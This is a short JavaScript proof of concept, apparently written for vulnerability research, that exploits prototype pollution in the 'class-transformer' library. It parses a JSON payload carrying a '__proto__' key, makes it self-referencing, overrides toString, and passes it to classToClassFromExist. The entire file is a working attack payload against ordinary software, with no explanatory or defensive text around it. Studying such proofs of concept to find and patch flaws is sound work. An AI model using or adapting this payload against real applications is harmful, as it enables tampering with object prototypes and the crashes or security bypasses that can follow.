const root = require("class-transformer");
const payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');

payload.__proto__.polluted = payload;
payload.toString = function() { return "yes" }
root.classToClassFromExist(payload, {}, { enableCircularCheck: true })
